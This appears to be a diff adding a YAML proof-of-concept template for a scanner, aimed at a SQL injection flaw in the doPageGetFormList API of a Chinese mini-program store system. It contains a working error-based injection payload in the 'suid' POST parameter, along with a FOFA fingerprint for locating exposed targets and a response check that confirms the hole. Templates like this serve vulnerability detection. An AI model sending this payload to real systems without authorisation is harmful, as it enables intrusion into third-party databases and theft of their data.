@@ -1,0 +1,20 @@
+id: poc-yaml-internet-wxapps-dopagegetformlist-sqli
+info:
+  name: 万能门店小程序doPageGetFormList存在sql注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 全行业小程序运营系统
+  fofa: /comhome/cases/index.html
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /api/wxapps/doPageGetFormList
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: suid='AND GTID_SUBSET(CONCAT((SELECT(md5({{.t1}})))),3119)-- bdmV
+  expression: "status_code == 500 && \ncontains(body,t2) &&\ncontains(body,\"error\"\
+    )\n"
+transport: http
